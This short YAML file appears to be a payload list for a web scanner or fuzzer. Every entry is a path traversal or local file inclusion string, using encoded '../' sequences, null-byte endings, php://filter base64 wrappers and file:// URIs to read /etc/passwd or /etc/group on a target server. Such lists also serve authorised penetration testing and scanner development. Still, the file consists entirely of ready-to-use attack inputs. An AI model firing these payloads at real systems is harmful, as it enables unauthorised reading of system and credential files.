generate:
  - payload:
    - /etc/passwd
    - /%5c../%5c../%5c../%5c../%5c../%5c../%5c../etc/passwd/
    - /../../../../../../../../../etc/passwd
    - /../../../../../../../../../etc/passwd%00
    - /../../../../../../../../../etc/passwd\u0000
    - "php://filter/convert.base64-encode/resource=../../../../../../../../../../etc/group"
    - "php://filter/convert.base64-encode/resource=../../../../../../../../../../etc/group\x00"
    - 'file:///etc/passwd'
    - 'file:///../../../../../../../../../etc/passwd'
    - 'file:///../../../../../../../../../etc/passwd\x00'
